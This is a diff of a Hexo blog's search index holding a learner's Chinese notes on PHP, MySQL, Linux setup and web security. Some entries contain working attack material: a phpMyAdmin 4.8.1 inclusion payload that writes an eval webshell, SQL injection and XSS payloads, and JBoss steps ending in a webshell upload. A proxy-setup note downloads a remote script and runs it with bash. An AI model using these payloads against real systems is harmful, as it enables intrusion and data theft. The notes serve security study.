@@ -1,12 +1,189 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title></title>
-    <url>%2F2019%2F02%2F19%2F1%2F</url>
-    <content type="text"><![CDATA[测试测试]]></content>
+    <title><![CDATA[错误mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given]]></title>
+    <url>%2F2019%2F02%2F20%2F23%2F</url>
+    <content type="text"><![CDATA[将以下代码加入$result = mysqli_query($conn,$query);（类似的）后面显示错误原因if (!$result) {printf(“Error: %s\n”, mysqli_error($conn));exit();}]]></content>
       <categories>
-        <category>网站</category>
+        <category>编程语言</category>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[pip更新]]></title>
+    <url>%2F2019%2F02%2F20%2F21%2F</url>
+    <content type="text"><![CDATA[如果你是用Python2.x，那就是Python2 -m pip install –upgrade pip如果你是Python3.x，那就是python3 -m pip install –upgrade pip]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Centos中安装py2和py3]]></title>
+    <url>%2F2019%2F02%2F20%2F22%2F</url>
+    <content type="text"><![CDATA[Centos自带python2，由于执行yum需要python2，所以即使安装了python3也不能删除python2 1.安装依赖包yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel 2.下载自己需要的python版本，例如python3.6.2,下载要花费一段时间，要耐心等待wget https://www.python.org/ftp/python/3.6.2/Python-3.6.2.tar.xz 3.新建一个文件夹存放python3mkdir /usr/local/python3 4.把安装包移动到该新建文件夹下，解压安装包，安装python3,依次执行以下命令，花费时间较长，耐心等待mv Python-3.6.2.tar.xz /usr/local/python3 tar -xvJf Python-3.6.2.tar.xz cd Python-3.6.2 ./configure --prefix=/usr/local/python3 make make install 5.创建软连接ln -s /usr/local/python3/bin/python3 /usr/bin/python3 ln -s /usr/local/python3/bin/pip3 /usr/bin/pip3 6.此时python3已经装好，在命令行中输入python3测试7.修改yum配置文件，python2与python3共存vi /usr/bin/yum 把#! /usr/bin/python修改为#! /usr/bin/python2（配置文件第一行） 同理 vi /usr/libexec/urlgrabber-ext-down 把文件里面的#! /usr/bin/python 也修改为#! /usr/bin/python2]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[csrf]]></title>
+    <url>%2F2019%2F02%2F20%2F17%2F</url>
+    <content type="text"><![CDATA[csrf（cross_site request forgery）跨站请求伪造(CSRF)是一种允许攻击者通过受害者发送任意HTTP请求的一类攻击方法。此处所指的受害者是一个不知情的同谋，所有的伪造请求都由他发起，而不是攻击者。这样，就很难确定哪些请求是属于跨站请求伪造攻击。eg:以下请求：GET http://bank.com/transfer.do?acct=jim&amp;amount=10000 HTTP/1.1可以被伪造成：http://bank.com/transfer.do?acct=mak&amp;amount=100000通过诱使用户点击伪造的链接，来达到攻击的目的。防范办法：0、使用POST方式而不是使用GET来提交表单，在处理表单提交时使用$_POST而不是$_REQUEST。1、使用Form表单替换A标签方式提交（A 的href参数中加入 token，就会造成风险，因为后置页面可以通过referer获取来源页面的完整url）。2、在特别重要的位置使用 https 进行数据传输。]]></content>
+      <categories>
+        <category>web</category>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[linux常见命令]]></title>
+    <url>%2F2019%2F02%2F20%2F20%2F</url>
+    <content type="text"><![CDATA[]]></content>
+      <categories>
+        <category>web</category>
         <category>linux</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[JBoss5.x6.x 反序列化漏洞]]></title>
+    <url>%2F2019%2F02%2F20%2F15%2F</url>
+    <content type="text"><![CDATA[1.图形工具DeserializeExploit获取信息2.找到自动部署目录：先在“文件管理“中，找到可以自动部署的目录3.复制url到”webshell上传“上传菜刀木马4.菜刀连接。]]></content>
+      <categories>
+        <category>web</category>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[xss]]></title>
+    <url>%2F2019%2F02%2F20%2F16%2F</url>
+    <content type="text"><![CDATA[反射型xss输入&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;弹出弹窗，若弹出，则可通过js代码偷到cookie想办法绕过&lt;script&gt;的过滤，如：&lt;img src=# onerror=alert(&quot;xss&quot;)&gt;通过加载一个不存在的图片出错出发javascript onerror事件 防范方法：对标签（&lt;script&gt;,&lt;a&gt;,&lt;img&gt;,&lt;iframe&gt;等）,特殊字符（’&lt;’, ‘&gt;’, ‘&amp;’, ‘“‘，’/‘）进行过滤避免echo中出现变量 注：str_replace这个函数是不区分大小写的，而且只替换一次 存储型xss感觉与反射型差不多。对输入数据库的内容中的标签,特殊字符进行过滤。]]></content>
+      <categories>
+        <category>web</category>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[mysql部分连接不上原因]]></title>
+    <url>%2F2019%2F02%2F20%2F19%2F</url>
+    <content type="text"><![CDATA[dbServername弄错了，（就是本机上填localhost那个参数）我就是犯了这个错误。系统hosts文件未提供填写的服务器参数的解析。方法：在服务器上查看host文件（在/etc里），看里面写了什么（一般为主机名和127.0.0.1）要么改为host里的主机名，要么把host文件改了 只要一出现“mysql_connect”函数，就没反应，也不报错。方法：将“libmysql.dll”复制到apache的bin目录下。然后重启，观察error.log，如果错误消失，那恭喜了。注：网上资料也有说将““libmysql.dll””“php_mysql.dll”复制到windows/system32的 运行时出现 fatal error: call to undefined function mysql_connect() in var/www/html/mytest.phpphp.ini中 extension_dir设置为 “d:＼apache2＼php＼ext “绝对路径，否则有些环境中会出错。 打开下面两行功能扩展 extension=php_mysql.dll extension=php_mysqli.dll 拷贝libmysql.dll(php目录下)和php_mysql.dll(php/ext目录下)至c:＼windows＼system32目录下(libmysql.dll必须为php目录下，比如我的为D:＼apache2＼php目录下的libmysql.dll，php_mysql.dll则在D:＼apache2＼php＼ext)测试， 1&gt; 先打开命令行A)依次点击“开始”菜单-&gt; “mysql”-&gt; “mysql5 server”-&gt; “MySQL Command Line Client”//如此步成功则mysql安全成功，失效则mysql安装失败，请卸载后重装 B)输入密码//此步正常则说明 root账户的密码正确。失败则账号密码有错 2&gt; 新建文件至主目录，并保存为testmysql.php，接着在浏览器中输入http://localhost/testmysql.php （或者http://localhost:81/testmysql.php） 如果不行查看一下apache是否加载了php与 mysql方法 apache中支置对php5的支持httpd.conf文件中加入下面三行PHPIniDir “D:/ccopen/php5/“LoadModule php5_module “D:/ccopen/php5/php5apache2_2.dll”AddType application/x-httpd-php .phpphp.ini中去掉下面两行分号extension=php_mysql.dllextension=php_mysqli.dll将php_mysql.dll和libmysql.dll拷到system32重起apache服务器]]></content>
+      <categories>
+        <category>web</category>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>mysql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[centos中下载phpstudy]]></title>
+    <url>%2F2019%2F02%2F20%2F18%2F</url>
+    <content type="text"><![CDATA[方法wget -c http://lamp.phpstudy.NET/phpstudy.bin #下载chmod +x phpstudy.bin #权限设置./phpstudy.bin #运行安装注：phpstudy.bin是重新改php等版本的（./运行）一次安装不行就多试几次，卡住了就重来（关于安装失败玄学问题的解决方法） 一些问题第一次会出现 -bash: mysql: command not found的情况是因为默认命令启动在/usr/local/bin（有些是/usr/bin）这时只需要cd到该目录再把mysql的目录映射过去就行了ln -fs /mysql的bin的绝对目录/mysql]]></content>
+      <categories>
+        <category>web</category>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[nmap]]></title>
+    <url>%2F2019%2F02%2F20%2F13%2F</url>
+    <content type="text"><![CDATA[你可以使用 通配符来扫描整个子网或某个范围的IP地址，如搜索本地虚拟机ip `nmap -sP 192.168.0.-sP 检测网络中有哪些在线主机 -v 给出了远程机器更详细的信息 -iL 扫描文件中列出的所有IP地址 --exclude+排除的ip -A 检测远程主机上运行的操作系统和版本-O和-osscan，-guess也帮助探测操作系统信息 -sA 是否使用了包过滤器或防火墙 -PN 是否受到数据包过滤软件或防火墙的保护 -F 执行一次快速扫描 -P+你想要扫描的端口如：nmap -p 80 server2.tecmint.comnmap -p T:8888（端口类型）,80（端口号） server2.tecmint.com`-sS 隐蔽的扫描-sT 扫描常用端口-sN 执行TCP空扫描以骗过防火墙 注：“，”隔开多个ip或端口，“ -”前后接范围]]></content>
+      <categories>
+        <category>web</category>
+        <category>工具运用</category>
+      </categories>
+      <tags>
+        <tag>技术</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[burpsuite]]></title>
+    <url>%2F2019%2F02%2F20%2F12%2F</url>
+    <content type="text"><![CDATA[12345678910111.Target(目标)——显示目标目录结构的的一个功能2.Proxy(代理)——拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。3.Spider(蜘蛛)——应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。4.Scanner(扫描器)——高级工具，执行后，它能自动地发现web 应用程序的安全漏洞。5.Intruder(入侵)——一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。6.Repeater(中继器)——一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具。7.Sequencer(会话)——用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。8.Decoder(解码器)——进行手动执行或对应用程序数据者智能解码编码的工具。9.Comparer(对比)——通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。10.Extender(扩展)——可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。11.Options(设置)——对Burp Suite的一些设置]]></content>
+      <categories>
+        <category>web</category>
+        <category>工具运用</category>
+      </categories>
+      <tags>
+        <tag>技术</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[密码总结]]></title>
+    <url>%2F2019%2F02%2F20%2F4%2F</url>
+    <content type="text"><![CDATA[1.摩尔斯电码2.brainfuck3.猪圈密码4.栅栏密码]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[phpmyadmin4.8.1漏洞]]></title>
+    <url>%2F2019%2F02%2F20%2F3.%2F</url>
+    <content type="text"><![CDATA[①SQL里 12345SELECT `&lt;?php $myfile = fopen(&apos;hikeny.php&apos;, &apos;w&apos;);fwrite($myfile,&quot;&lt;?php @eval($&quot;.&quot;_POST[&apos;hikeny&apos;]);echo 233;?&gt;&quot;);fclose($myfile);?&gt;`//添加一句话木马PHP文件到该目录下的PHP代码 如http://127.0.0.1/phpmyadmin/index.php/？target=db_sql.php%253f/../../../../../../tmp/sess_56f7a57961edae31cefa0cdf973ccdef ②URL里 加?target=db_sql.php%253f/../../../../../../tmp/sess_ cookie里的phpMyAdmin //session文件会记录sql查询的内容，如果有PHP代码会执行 session文件打开时里面的php代码会自动运行]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>鸡翘</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[mysql炒鸡常用语法]]></title>
+    <url>%2F2019%2F02%2F20%2F2%2F</url>
+    <content type="text"><![CDATA[123456789101112131.启动MYSQL服务 net start mysql2.停止MYSQL服务 net stop mysql3.登陆 mysql （-h 主机地址） -u 用户名 －p 用户密码4.切换 use;5.显示 show;6.查询 select from;7.插入 insert into xx values (1, &apos;xx&apos;);8.更新 update 表 set 字段=&apos;aaa&apos; where 同行的;9.删除 drop10.改密码 1.use mysql; 2.update user set password=password(&apos;新密码&apos;) where user=&apos;root&apos; and host=&apos;localhost&apos;; 3.flush privileges;]]></content>
+      <categories>
+        <category>语法</category>
+      </categories>
+      <tags>
+        <tag>mysql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[sql注入]]></title>
+    <url>%2F2019%2F02%2F20%2F14%2F</url>
+    <content type="text"><![CDATA[构建1 or 1=1如：1’or’1’=’1 注释符号：1、#2、”– …”(有空格)3、/*…*/ 123456789101112131&apos; order by 2 -- /*用来猜解查询信息的列数1&apos; and 1=2 union select user(),database(),-- 1&apos; and 1=2 union select user(),version(), -- /*利用user(),database(),version()函数获得数据库信息1&apos;and 1=2 union select 1,@@global.version_compile_os from mysql.user -- /*获得操作系统信息1&apos; and ord(mid(user(),1,1))=114 -- /*测试连接数据库用户权限1&apos; and 1=2 union select 1,schema_name from information_schema.schemata -- /*爆出所有数据库名称1&apos; and exists(select * from users) -- /*猜解表名1&apos; and exists(select first_name from users) -- /猜解字段名1&apos; and 1=2 union select first_name,last_name from users -- /*猜解字段内容 判断有无过滤或过滤方法并想办法绕掉，如：用了md5的绕过方法：ffifdyopmd5后，276f722736c95d99e921722cf9ed621c再转成字符串： ‘or’6&lt;其他字符&gt; 防范方法：1.黑名单过滤特殊符号。如：$userName=$conn-&gt;real_escape_string($userName)2.限制输入的字符数。3.限制连接数据库的账号的权限。]]></content>
+      <categories>
+        <category>web</category>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[百度搜索语法]]></title>
+    <url>%2F2019%2F02%2F19%2F1%2F</url>
+    <content type="text"><![CDATA[intitle：后接网址题目 site：后接网址 inurl搜索范围限定在url链接中 双引号“”（双引号里的不会拆开）和书名号《》精确匹配（书，同上） -后接不含该词的 +包含特定查询词（与上相反） Filetype：文档格式]]></content>
+      <categories>
+        <category>语法</category>
       </categories>
       <tags>
         <tag>技术</tag>
@@ -14,35 +191,35 @@
   </entry>
   <entry>
     <title><![CDATA[查看XX里包含的文件并将其分开]]></title>
-    <url>%2F2018%2F10%2F17%2F444%2F</url>
+    <url>%2F2018%2F10%2F17%2F8%2F</url>
     <content type="text"><![CDATA[强力kali有些文件或图片隐藏的一些东西，可以用kali里面的命令binwalk 和foremost 搞出来（命令后接文件名）。binwalk发现并列出子文件，foremost将其分开并保存在桌面。 注：一些损坏的压缩包也将其中的文件可以搞出来。]]></content>
       <categories>
-        <category>ctf嗯嗯</category>
-        <category>kali</category>
+        <category>ctf</category>
+        <category>鸡翘</category>
       </categories>
       <tags>
-        <tag>技术</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[zip密码破解]]></title>
-    <url>%2F2018%2F10%2F17%2F333%2F</url>
+    <url>%2F2018%2F10%2F17%2F7%2F</url>
     <content type="text"><![CDATA[强力kali kali里有许多程序可以搞事情，网上搜搜命令就可以用了。比如：fcrackzip 强力ARCHPR 这个密码爆破工具在win上运行（网上有中文版的，简单方便），除了暴力破解外，里面还有 明文破解。只要你有加密压缩包中的 任意一个文件（一模一样的那种），再将其压缩 （压缩格式，算法要一样 ）,最后用archpr将两个压缩包进行比较就搞出来了（可以打 开加密压缩包，但密码具体是多少搞不出来） 找出加密压缩包的压缩算法的心酸这个东西很痛苦，__首先__ 先自己把加密压缩包删到只剩已得到的那个文件，通过右键查看 属性，得知该文件原大小（顺便看看压缩率多少）以确定是否与已得到的文件相同，__其次__ 我再将已得到的那个文件 __以各种姿势__ 进行加密压缩，直到压缩率与加密压缩包相同（过 程苦逼）。]]></content>
       <categories>
-        <category>ctf嗯嗯</category>
-        <category>kali</category>
+        <category>ctf</category>
+        <category>鸡翘</category>
       </categories>
       <tags>
-        <tag>技术</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[win10改用户权限]]></title>
-    <url>%2F2018%2F10%2F08%2Fzz%2F</url>
+    <url>%2F2018%2F10%2F08%2F11%2F</url>
     <content type="text"><![CDATA[改win10用户权限的办法我这个版本的win10没有“用户和组”，网上传的一些普通的方法改不了权限，找到了如下的方法才解决： 1、使用“Win+R”快捷键或右键单击左下角，进入运行界面;输入netplwiz进入用户帐户设置界面。 2、选择要增加权限的账户，点击属性。 3、点击组成员，点选最后一行的“其他”。 另外，这样host还是改不了正确办法有时候百度经验还是有用的]]></content>
       <categories>
-        <category>网站</category>
-        <category>PHP</category>
+        <category>web</category>
+        <category>环境搭建</category>
       </categories>
       <tags>
         <tag>用户权限</tag>
@@ -50,48 +227,49 @@
   </entry>
   <entry>
     <title><![CDATA[翻墙工具SSR的搭建]]></title>
-    <url>%2F2018%2F10%2F06%2F111%2F</url>
-    <content type="text"><![CDATA[刚开始。。。果然，翻墙 这两个字还是挺敏感的，直接搜标题是搜不到东西的，我一删去这两个字，就搜到了优秀的搭建流程，不过当我看见 “第一步、服务器购买”,我就决定先把它放置一段时间来。 不过。。。我觉得服务器这个东西好像还挺重要的，就去建了个tomcat服务器(自己建自己的贼舒服)。但目前还不知道用来干什么。]]></content>
+    <url>%2F2018%2F10%2F06%2F5%2F</url>
+    <content type="text"><![CDATA[1.买个海外的服务器（Digital Ocean便宜，不过）2.用工具连接（建议MobaXterm，特别好用），输入ip 用户名 密码3.复制下面的代码，然后回车12yum -y install wgetwget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssrmu.sh &amp;&amp; chmod +x ssrmu.sh &amp;&amp; bash ssrmu.sh 4.随便填填，问什么填什么,出现这个就算成功了。5.连接pc上用SSTap，安卓上用shadowsocks。安卓上的那个不好找，可以在电脑上翻墙后在github里找。]]></content>
       <categories>
-        <category>网站</category>
-        <category>linux</category>
+        <category>web</category>
+        <category>环境搭建</category>
       </categories>
       <tags>
-        <tag>技术</tag>
+        <tag>服务器</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[LAMP/LNMP搭建网站]]></title>
-    <url>%2F2018%2F10%2F06%2Frmb%2F</url>
+    <url>%2F2018%2F10%2F06%2F10%2F</url>
     <content type="text"><![CDATA[最开始，我试着去搜索手动搭建流程，发现全是从lamp/lnmp一键安装起的头。然后我就找到了个无人值守安装命令生成器（输入生成的命令后居然安装了28min）。然后按着流程操作。但是 我没有域名（不想花钱买域名),网上有一些 注册送域名，但是这种免费的域名貌似没有给你多少权限（目前勉强够用）。]]></content>
       <categories>
-        <category>网站</category>
-        <category>linux</category>
+        <category>web</category>
+        <category>环境搭建</category>
       </categories>
       <tags>
-        <tag>技术</tag>
+        <tag>服务器</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[hexo上传的文件怎么弄]]></title>
-    <url>%2F2018%2F10%2F04%2F222%2F</url>
+    <url>%2F2018%2F10%2F04%2F6%2F</url>
     <content type="text"><![CDATA[工具我发现直接在文档上写东西会出现一些莫名其妙的问题（比如输入汉字出现乱码）。所以我就找到了一些文档编辑器（忘了有哪些了），我用的atom（注意右下角选utf-8）。 写文件要用的东西（干货）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# 写作介绍## 1，字体介绍*这是斜体* 或 _这也是斜体_**这是粗体*****这是加粗斜体***~~这是删除线~~## 2，分级标题# 一级标题## 二级标题### 三级标题#### 四级标题##### 五级标题###### 六级标题## 3，超链接写法：行内形式：[我的博客](https://xfbxfbxfb.github.io/)参考形式：[我的博客][1]，有一个很好的平台-[简书][2][1]:https://xfbxfbxfb.github.io/[2]:http://www.jianshu.com/自动链接：我的博客地址&lt;https://xfbxfbxfb.github.io/&gt;## 4,列表无序列表：写法：* 无序列表项1+ 无序列表项2- 无序列表项3有序列表：写法：1.有序列表项12.有序列表项23.有序列表项3## 5，插入图片在 Hexo 中插入图片，首先需要将图片放在xxxx(与该md文件同名)文件夹下，然后如下方式进行插入：![你想输入的替代文字](xxxx/图片名.jpg)## 6，表格| 表头1|表头2|表头3|表头4|-| :- | :-: | -: ||默认左对齐|左对齐|居中对其|右对齐||默认左对齐|左对齐|居中对其|右对齐||默认左对齐|左对齐|居中对其|右对齐| 这个东西非原创，从网上到处翻的（所有符号前要有空格）。]]></content>
       <categories>
-        <category>hexo</category>
+        <category>语法</category>
       </categories>
       <tags>
-        <tag>技术</tag>
+        <tag>hexo</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[hexo博客遭遇的神奇问题]]></title>
-    <url>%2F2018%2F10%2F04%2F5479%2F</url>
+    <url>%2F2018%2F10%2F04%2F9%2F</url>
     <content type="text"><![CDATA[这个博客我建了很久（我是电脑小白），其间遇到了两个低级问题，网上却没有人指出（可能是这些问题太低级了吧），今天特来整理一下这些问题。hexo搭建流程(亲测有效) git bash重启后hexo指令无效1cd hexo的目录 这个问题让我重安了很多次hexo（ 苦逼），所以我就把它放在第一位。 关于_config.yml文件的修改这个东西很迷，这个文件我直接在目录里查找，找到了四个，需要改的文件居然有 两个，格式 直接复制到文件再修改。格式如下：1234deploy: type: git repo: 填你自己的 branch: master ssh密钥在哪我直接在电脑里搜 .ssh 文件,那个pub结尾的那个用记事本打开，里面的全部就是密钥。]]></content>
       <categories>
-        <category>hexo</category>
+        <category>web</category>
+        <category>环境搭建</category>
       </categories>
       <tags>
-        <tag>技术</tag>
+        <tag>hexo</tag>
       </tags>
   </entry>
 </search>
